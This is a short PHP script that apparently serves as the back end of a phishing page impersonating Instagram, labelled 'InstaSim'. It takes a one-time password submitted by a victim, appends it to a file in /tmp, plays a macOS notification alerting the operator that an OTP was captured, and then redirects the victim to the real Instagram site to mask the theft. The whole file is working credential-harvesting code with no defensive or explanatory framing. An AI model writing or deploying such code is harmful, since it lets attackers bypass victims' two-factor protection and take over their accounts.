<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$data = "OTP: " . $_POST['otp'] . "\n";
$data .= "========================\n\n";

file_put_contents("/tmp/data.txt", $data, FILE_APPEND);
exec("osascript -e 'display notification \"OTP submitted\" with title \"InstaSim\" sound name \"Submarine\"'");
header("Location: https://www.instagram.com/");
exit;
?>